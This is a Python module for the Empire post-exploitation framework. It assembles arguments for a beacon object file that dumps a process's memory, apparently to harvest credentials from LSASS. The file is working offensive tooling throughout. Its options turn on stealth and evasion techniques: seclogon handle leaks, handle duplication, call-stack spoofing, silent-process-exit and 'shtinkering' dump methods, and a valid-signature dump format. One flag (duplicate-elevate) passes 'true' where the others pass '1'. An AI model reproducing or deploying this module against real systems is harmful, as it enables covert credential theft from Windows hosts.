from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        params["Architecture"] = "x64"
        script_file, script_end = main_menu.modulesv2.generate_bof_data(
            module=module, params=params, obfuscate=obfuscate
        )

        for name, value in params.items():
            if name == "write":
                if value != "":
                    dump_path = value
                    write_file = "1"
                else:
                    dump_path = "find_me.dmp"
                    write_file = "0"

            if name == "valid":
                use_valid_sig = "1" if value == "true" else "0"

            if name == "fork":
                fork = "1" if value == "true" else "0"

            if name == "snapshot":
                snapshot = "1" if value == "true" else "0"

            if name == "duplicate":
                dup = "1" if value == "true" else "0"

            if name == "elevate-handle":
                elevate_handle = "1" if value == "true" else "0"

            if name == "duplicate-elevate":
                duplicate_elevate = value if value == "true" else "0"

            if name == "getpid":
                if value == "true":
                    pid = "1"
                    get_pid = "1"
                else:
                    pid = "0"
                    get_pid = "0"

            if name == "seclogon-leak-local":
                use_seclogon_leak_local = "1" if value == "true" else "0"

            if name == "seclogon-leak-remote":
                if value == "true":
                    use_seclogon_leak_remote = "1"
                    seclogon_leak_remote_binary = "0"
                else:
                    use_seclogon_leak_remote = "0"
                    seclogon_leak_remote_binary = ""

            if name == "seclogon-duplicate":
                use_seclogon_duplicate = "1" if value == "true" else "0"

            if name == "spoof-callstack":
                spoof_callstack = "1" if value == "true" else "0"

            if name == "silent-process-exit":
                if value != "":
                    silent_process_exit = ""
                    use_silent_process_exit = "1"
                else:
                    silent_process_exit = ""
                    use_silent_process_exit = "0"

            if name == "shtinkering":
                shtinkering = "1" if value == "true" else "0"

        script_end += f" -i:{pid} -z:{dump_path} -i:{write_file} -i:{use_valid_sig} -i:{fork} -i:{snapshot} -i:{dup} -i:{elevate_handle} -i:{duplicate_elevate} -i:{get_pid} -i:{use_seclogon_leak_local} -i:{use_seclogon_leak_remote} -z:{seclogon_leak_remote_binary} -i:{use_seclogon_duplicate} -i:{spoof_callstack} -i:{use_silent_process_exit} -z:{silent_process_exit} -i:{shtinkering}"
        return f"{script_file}|{script_end}"
